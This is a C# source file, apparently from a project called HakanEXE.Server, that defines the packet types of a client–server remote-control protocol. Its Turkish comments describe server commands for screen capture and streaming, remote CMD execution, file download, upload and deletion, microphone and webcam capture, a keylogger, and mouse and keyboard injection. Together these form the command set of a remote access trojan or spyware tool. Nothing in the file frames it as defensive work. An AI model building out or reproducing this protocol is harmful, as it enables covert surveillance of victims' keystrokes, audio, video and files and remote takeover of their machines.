using System;

namespace HakanEXE.Server.Models
{
    public enum PacketType
    {
        ClientInfo,         // İstemcinin ilk bağlantıda gönderdiği sistem bilgisi
        RequestScreenshot,  // Sunucu -> İstemci: Ekran görüntüsü iste
        Screenshot,         // İstemci -> Sunucu: Ekran görüntüsü verisi (base64 string)
        StartScreenStream,  // Sunucu -> İstemci: Ekran akışını başlat
        StopScreenStream,   // Sunucu -> İstemci: Ekran akışını durdur
        Shutdown,           // Sunucu -> İstemci: Bilgisayarı kapat
        Restart,            // Sunucu -> İstemci: Bilgisayarı yeniden başlat
        ExecuteCommand,     // Sunucu -> İstemci: CMD komutu çalıştır
        CommandOutput,      // İstemci -> Sunucu: CMD komut çıktısı
        OpenNotepad,        // Sunucu -> İstemci: Not Defteri aç
        RequestFileList,    // Sunucu -> İstemci: Dizin içeriğini iste
        FileList,           // İstemci -> Sunucu: Dizin içeriği
        DownloadFile,       // Sunucu -> İstemci: Dosya indir isteği
        UploadFile,         // Sunucu -> İstemci: Dosya yükleme isteği
        FileData,           // İstemci/Sunucu: Dosya verisi (byte[])
        DeleteFile,         // Sunucu -> İstemci: Dosya sil
        StartMicrophone,    // Sunucu -> İstemci: Mikrofon dinlemeyi başlat
        StopMicrophone,     // Sunucu -> İstemci: Mikrofon dinlemeyi durdur
        MicrophoneData,     // İstemci -> Sunucu: Mikrofon ses verisi
        StartWebcam,        // Sunucu -> İstemci: Webcam görüntüsünü başlat
        StopWebcam,         // Sunucu -> İstemci: Webcam görüntüsünü durdur
        WebcamData,         // İstemci -> Sunucu: Webcam görüntü verisi
        StartKeylogger,     // Sunucu -> İstemci: Keylogger başlat
        StopKeylogger,      // Sunucu -> İstemci: Keylogger durdur
        KeylogData,         // İstemci -> Sunucu: Keylogger verisi
        RequestSystemInfo,  // Sunucu -> İstemci: Detaylı sistem bilgisi iste
        SystemInfo,         // İstemci -> Sunucu: Detaylı sistem bilgisi (JSON)
        MouseMove,          // Sunucu -> İstemci: Mouse hareketi
        MouseClick,         // Sunucu -> İstemci: Mouse tıklaması
        KeyboardInput,      // Sunucu -> İstemci: Klavye girişi
        Heartbeat           // Bağlantı kontrolü için periyodik mesaj
    }

    public class Packet
    {
        public PacketType PacketType { get; set; }
        public string Data { get; set; } // JSON serialize edilmiş veri
        public string SenderIp { get; set; } // Paketi gönderen IP
    }
}